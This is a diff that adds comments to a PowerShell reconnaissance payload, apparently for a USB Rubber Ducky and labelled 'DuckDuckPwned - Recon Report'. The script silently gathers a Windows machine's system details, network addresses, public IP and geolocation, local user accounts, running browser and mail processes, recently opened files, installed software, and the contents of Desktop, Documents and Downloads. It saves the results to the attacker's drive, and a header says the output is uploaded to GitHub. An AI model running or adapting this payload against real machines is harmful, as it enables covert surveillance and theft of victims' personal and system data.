@@ -1,3 +1,4 @@
+
 param([string]$DuckyDrive)
 
 # ============================================================
@@ -6,13 +7,16 @@ param([string]$DuckyDrive)
 # Output: uploaded to github
 # ============================================================
 
+# === Output File ===
 $out = "$DuckyDrive\Recon.txt"
 $line = "=" * 52
 
+# === Helper for Section Header ===
 function Section($title) {
     "`n$line`n  $title`n$line" | Out-File $out -Append
 }
 
+# === Report Header ===
 @"
 $line
     DuckDuckPwned - Recon Report
@@ -20,6 +24,9 @@ $line
 $line
 "@ | Out-File $out
 
+# ====================
+# SYSTEM INFORMATION
+# ====================
 Section "SYSTEM INFO"
 
 $os  = Get-WmiObject Win32_OperatingSystem
@@ -38,6 +45,9 @@ $uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
   System Dir : $($os.SystemDirectory)
 "@ | Out-File $out -Append
 
+# ====================
+# NETWORK INFORMATION
+# ====================
 Section "NETWORK INFO"
 
 Get-NetIPAddress -AddressFamily IPv4 |
@@ -47,6 +57,9 @@ Get-NetIPAddress -AddressFamily IPv4 |
     Out-String |
     Out-File $out -Append
 
+# ========================
+# GEOLOCATION + PUBLIC IP 
+# ========================
 Section "LOCATION + PUBLIC IP"
 
 try {
@@ -64,6 +77,9 @@ try {
     "  [!] No internet access - geolocation skipped" | Out-File $out -Append
 }
 
+# ==============
+# LOCAL USERS
+# ==============
 Section "LOCAL USERS"
 
 Get-LocalUser |
@@ -72,6 +88,9 @@ Get-LocalUser |
     Out-String |
     Out-File $out -Append
 
+# ==================
+# WATCHED PROCESSES
+# ==================
 Section "NOTABLE RUNNING PROCESSES"
 
 $watchlist = @("chrome","firefox","edge","outlook","teams",
@@ -85,6 +104,9 @@ Get-Process |
     Out-String |
     Out-File $out -Append
 
+# =============
+# RECENT FILES
+# =============
 Section "RECENTLY ACCESSED FILES (Last 20)"
 
 Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
@@ -94,6 +116,9 @@ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyConti
     Out-String |
     Out-File $out -Append
 
+# ====================
+# INSTALLED SOFTWARE
+# ====================
 Section "INSTALLED SOFTWARE (Top 30)"
 
 Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" `
@@ -106,6 +131,9 @@ Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" `
     Out-String |
     Out-File $out -Append
 
+# =================
+# FILE SYSTEM TREE 
+# =================
 Section "FILE SYSTEM TREE"
 
 foreach ($folder in @("Desktop", "Documents", "Downloads")) {
@@ -118,6 +146,9 @@ foreach ($folder in @("Desktop", "Documents", "Downloads")) {
     }
 }
 
+# ===============
+# FINAL OUTPUT
+# ===============
 @"
 
 $line
@@ -125,4 +156,5 @@ $line
 $line
 "@ | Out-File $out -Append
 
+# === OPEN REPORT ===
 Start-Process notepad $out
